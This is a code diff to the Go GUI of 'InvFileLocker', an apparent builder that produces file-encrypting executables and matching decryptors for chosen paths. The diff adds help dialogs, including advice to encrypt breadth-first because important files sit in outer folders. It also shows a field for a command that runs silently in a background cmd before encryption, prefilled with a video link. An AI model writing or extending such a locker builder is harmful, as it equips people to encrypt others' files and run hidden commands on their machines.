@@ -10,6 +10,7 @@ import (
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/canvas"
 	"fyne.io/fyne/v2/container"
+	"fyne.io/fyne/v2/dialog"
 	"fyne.io/fyne/v2/widget"
 )
 
@@ -21,10 +22,10 @@ func main() {
 	w := a.NewWindow("InvFileLocker 文件加密")
 
 	header := widget.NewLabel(`
-———————————.——.——.        .————.                .——.                
+.——————————.——.——.        .————.                .——.                
 \—   —————/|——|  |   .——. |    |    .——.   .——. |  | —— .—————————. 
- |    ——)  |  |  | —/ —— \|    |   /  — \ / ———\|  |/ // —— \—  —— \
- |     \   |  |  |—\  ———/|    |——(  < > )  \———|    <\  ———/|  | \/
+ |    ——)  |  |  | —/ —— \|    |   / —— \ / .——\|  |/ // —— \—  —— \
+ |     \   |  |  |—\  ———/|    |——( <  > )  \———|    <\  ———/|  | \/
  \——.  /   |——|————/\——.  >——————. \————/ \———  >——|— \\———  >——|   
      \/                 \/        \/          \/     \/    \/   
 
@@ -41,6 +42,9 @@ InvFileLocker originally ` + VERSION)
 
 	//选择路径遍历算法列
 	trans_algo_tips := widget.NewLabel("路径遍历算法：")
+	trans_algo_tips_tips := widget.NewButton("?", func() {
+		dialog.NewInformation("路径遍历算法", "BFS算法：首先加密文件夹中的第一层文件，然后第二层，第三层...普遍推荐用户使用BFS算法，因为较为重要的文件一般处于文件夹外层\nDFS算法：可以将其简单地理解为逐个文件夹加密，首先加密完文件夹中第一个文件夹的所有文件，然后再加密第二个.", w).Show()
+	})
 	var trans_algo_bfs_choice *widget.Check
 	trans_algo_bfs_choice = widget.NewCheck("BFS算法", func(value bool) {
 		trans_algo_bfs_choice.Checked = true
@@ -51,20 +55,23 @@ InvFileLocker originally ` + VERSION)
 		trans_algo_dfs_choice.Checked = false
 	})
 	trans_algo_dfs_choice.Checked = false
-	trans_algo_row := container.NewHBox(trans_algo_tips, trans_algo_bfs_choice, trans_algo_dfs_choice)
+	trans_algo_row := container.NewHBox(trans_algo_tips, trans_algo_tips_tips, trans_algo_bfs_choice, trans_algo_dfs_choice)
 
 	//是否开启多线程列
-	multi_thread := widget.NewLabel("是否开启多线程同时加密")
+	multi_thread := widget.NewLabel("是否开启多线程同时加密：")
 	multi_thread_start_choice := widget.NewCheck("", func(value bool) {})
 	multi_thread_start_choice.Checked = false
 	multi_thread_row := container.NewHBox(multi_thread, multi_thread_start_choice)
 
 	//命令输入列
 	cmd_input_tips := widget.NewLabel("请输入在加密前运行的命令：")
+	cmd_input_tips_tips := widget.NewButton("?", func() {
+		dialog.NewInformation("加密前运行的命令", "在加密器运行前，首先会在后台cmd中运行指定命令", w).Show()
+	})
 	cmd_input := widget.NewEntry()
 	cmd_input.SetMinRowsVisible(12)
 	cmd_input.SetText("start https://www.bilibili.com/video/BV1GJ411x7h7?verify=true")
-	cmd_row := container.NewBorder(nil, nil, cmd_input_tips, nil, cmd_input)
+	cmd_row := container.NewBorder(nil, nil, container.NewHBox(cmd_input_tips, cmd_input_tips_tips), nil, cmd_input)
 
 	//路径输入列
 	path_input_tips := widget.NewLabel("请在下面的输入框中输入要加密的路径，一行一个")
@@ -114,7 +121,7 @@ InvFileLocker originally ` + VERSION)
 			return
 		}
 
-		encryptor_path, decryptor_path, err := generate(path_slice, aes_min, cmd_input.Text, multi_thread_start_choice.Checked)
+		encryptor_path, decryptor_path, _, err := generate(path_slice, aes_min, cmd_input.Text, multi_thread_start_choice.Checked)
 		if err != nil {
 			error_tips_multiline.SetText(error_tips_multiline_text)
 			error_tips.Text += "*生成失败: " + err.Error()
